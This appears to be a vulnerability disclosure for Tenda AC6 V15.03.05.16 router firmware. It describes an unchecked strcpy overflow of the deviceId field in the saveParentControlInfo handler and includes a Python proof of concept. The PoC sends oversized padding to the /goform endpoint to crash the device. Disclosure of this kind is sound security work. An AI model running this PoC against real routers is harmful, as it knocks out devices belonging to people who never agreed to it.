## Tenda AC6 V15.03.05.16 firmware has a buffer overflow vulnerability in the saveParentControlInfo  function

Firmware download website:
[AC6V1.0升级软件](https://www.tenda.com.cn/material/show/102661)

Tenda AC6 V15.03.05.16 firmware has a buffer overflow vulnerability in the `saveParentControlInfo` function. The `strcpy((char *)ptr + 2, src);` function copies the `deviceId` string content to `ptr and s_3` without doing a boundary check, which will cause a buffer overflow and overwrite the memory area after the array, which may cause the program to crash, thereby triggering this security vulnerability.

![image-20250330234540456](README/image-20250330234540456.png)

### POC

```py
import requests

def generate_overflow_data():
    # Target buffer size is 0x400 bytes
    padding = b"X" * 0x400
    
    exploit_data = padding 
    
    return exploit_data

def execute_overflow(url, data):
    # Prepare malicious request parameters
    attack_params = {'deviceId':data}
   

    
    # Send the malicious request twice (as in original)
    server_response = requests.get(url, params=attack_params)
    server_response = requests.get(url, params=attack_params)
    
    # Display server response
    print("HTTP Status:", server_response.status_code)
    print("Response Content:", server_response.text)

if __name__ == "__main__":
    # Target endpoint
    target_url = "http://192.168.102.145/goform/saveParentControlInfo"
    
    # Generate overflow payload
    malicious_payload = generate_overflow_data()
    
    # Execute the attack
    execute_overflow(target_url, malicious_payload)
```

![image-20250330234439885](README/image-20250330234439885.png)